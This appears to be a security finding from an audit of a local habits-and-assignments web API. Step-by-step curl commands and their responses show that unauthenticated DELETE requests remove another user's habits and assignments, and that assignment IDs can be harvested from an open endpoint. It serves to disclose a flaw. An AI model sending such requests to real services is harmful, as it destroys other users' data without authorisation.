Unauthenticated deletion of another user's data
Captured 2026-10-10

1) Plant (see F02-cross-user-write-habits.txt): habit id c813a02e-ebf0-4969-9ed3-9be3267c2f62
   created under testUser2 by an unauthenticated POST /habits.

2) Read testUser2's habits unauthenticated, confirm the planted id is present:
   $ curl "http://127.0.0.1:8000/habits?username=testUser2"
   -> includes {"id":"c813a02e-ebf0-4969-9ed3-9be3267c2f62", ..., "username":"testUser2", "title":"F02-planted"}

3) Delete it with no credentials of any kind, not even the username:
   $ curl -i -X DELETE "http://127.0.0.1:8000/habits/c813a02e-ebf0-4969-9ed3-9be3267c2f62"
   HTTP/1.1 204 No Content

4) Re-read testUser2's habits unauthenticated: F02-planted is gone; the user's other
   (seeded) habits are untouched.
   $ curl "http://127.0.0.1:8000/habits?username=testUser2"
   -> ["Apply for Job", "read book", "Manage Inventory"]  (F02-planted absent)

--- Assignments: identical gap, but worse ---
Planted assignment _id 6aca7753c8f60271923c8aa1 (title "F02-planted", testUser2), then:

$ curl -i -X DELETE "http://127.0.0.1:8000/assignments/6aca7753c8f60271923c8aa1"
HTTP/1.1 200 OK
{"success":true,"id":"6aca7753c8f60271923c8aa1"}

Re-read of GET /assignments/user/testUser2 confirms it is gone and the user's other
assignments are untouched.

FINDING: The DELETE request for an assignment carries only the Mongo ObjectId in the
URL path. There is no username, header, cookie or token anywhere in the request -
not even an unverified one. Any caller who can see or guess an assignment ID (ids are
sequential-ish ObjectIds, and are returned in cleartext by the unauthenticated GET
/assignments global dump - see F02.md) can delete any assignment belonging to any user,
with no identity check whatsoever. The /habits delete route is the same shape
(DELETE /habits/{id}, no ownership check) but at least the id is a random UUID rather
than an enumerable ObjectId.
